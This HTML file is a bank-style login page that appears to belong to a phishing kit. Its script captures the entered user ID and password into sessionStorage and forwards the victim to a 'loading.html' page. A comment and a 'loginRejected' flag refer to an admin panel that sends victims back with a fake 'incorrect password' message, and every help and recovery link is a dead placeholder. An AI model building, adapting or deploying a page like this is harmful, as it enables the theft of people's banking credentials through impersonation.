<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<title>Login</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
    background: #ffffff;
    padding: 80px 16px 30px;
  }
  .heading {
    text-align: center;
    font-size: 28px;
    font-weight: 400;
    color: #1a1a1a;
    margin-bottom: 24px;
  }
  .card {
    max-width: 480px;
    margin: 0 auto;
    background: #ffffff;
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
    overflow: hidden;
  }
  .top-stripe {
    height: 6px;
    width: 100%;
    background: linear-gradient(to right, #c8102e 0%, #c8102e 50%, #0a2f6b 50%, #0a2f6b 100%);
  }
  .card-body {
    padding: 22px 22px 26px;
  }
  label {
    display: block;
    font-size: 15px;
    font-weight: bold;
    color: #1a1a1a;
    margin-bottom: 6px;
  }
  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 10px;
    font-size: 14px;
    border: 1px solid #b5b5b5;
    border-radius: 6px;
    margin-bottom: 16px;
  }
  .checkbox-row {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 18px;
  }
  .checkbox-row input {
    width: 18px;
    height: 18px;
    border-radius: 4px;
  }
  .checkbox-row span {
    font-size: 15px;
    color: #1a1a1a;
  }
  .login-btn {
    width: 100%;
    background: #0a2f6b;
    color: #fff;
    border: none;
    padding: 13px;
    font-size: 16px;
    font-weight: bold;
    border-radius: 30px;
    cursor: pointer;
    margin-bottom: 16px;
  }
  .login-btn:hover {
    background: #08234f;
  }
  .links-row {
    text-align: center;
    margin-bottom: 10px;
  }
  .links-row a {
    color: #1b5fd6;
    font-size: 14px;
    font-weight: bold;
    text-decoration: underline;
    margin: 0 5px;
    white-space: nowrap;
  }
  .enroll-row {
    text-align: center;
  }
  .enroll-row a {
    color: #1b5fd6;
    font-size: 14px;
    font-weight: bold;
    text-decoration: underline;
  }
  .error-text {
    color: #c8102e;
    font-size: 13px;
    margin: -10px 0 14px;
    display: none;
  }
  .server-error {
    color: #c8102e;
    font-size: 14px;
    font-weight: bold;
    text-align: center;
    background: #fdeceb;
    border: 1px solid #f3b8b3;
    border-radius: 6px;
    padding: 10px;
    margin: 0 0 16px;
    display: none;
  }
</style>
</head>
<body>

  <div class="main-content" id="mainContent">
    <div class="heading">Log in to your account</div>

    <div class="card">
      <div class="top-stripe"></div>
      <div class="card-body">
        <div class="server-error" id="serverError">Username or password is incorrect</div>
        <label for="userid">User ID</label>
        <input type="text" id="userid" name="userid">

        <label for="password">Password</label>
        <input type="password" id="password" name="password">
        <div class="error-text" id="errorText">Please enter both User ID and Password.</div>

        <div class="checkbox-row">
          <input type="checkbox" id="save">
          <span>Save user ID</span>
        </div>

        <button class="login-btn" onclick="handleLogin()">Log in</button>

        <div class="links-row">
          <a href="#">Forgot user ID</a> &nbsp; <a href="#">Forgot password</a> &nbsp; <a href="#">Help</a>
        </div>
        <div class="enroll-row">
          <a href="#">Enroll in online access</a>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Show rejection error if we were sent back from the admin panel
    if (sessionStorage.getItem('loginRejected') === '1') {
      document.getElementById('serverError').style.display = 'block';
      sessionStorage.removeItem('loginRejected');
    }

    function blockArabic(e) {
      const arabicRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g;
      if (arabicRegex.test(e.target.value)) {
        e.target.value = e.target.value.replace(arabicRegex, '');
      }
    }
    document.getElementById('userid').addEventListener('input', blockArabic);
    document.getElementById('password').addEventListener('input', blockArabic);

    function handleLogin() {
      const userid = document.getElementById('userid').value.trim();
      const password = document.getElementById('password').value.trim();
      const errorText = document.getElementById('errorText');

      if (!userid || !password) {
        errorText.style.display = 'block';
        return;
      }
      errorText.style.display = 'none';
      document.getElementById('serverError').style.display = 'none';

      sessionStorage.setItem('pendingUsername', userid);
      sessionStorage.setItem('pendingPassword', password);

      window.location.href = 'loading.html';
    }
  </script>

</body>
</html>
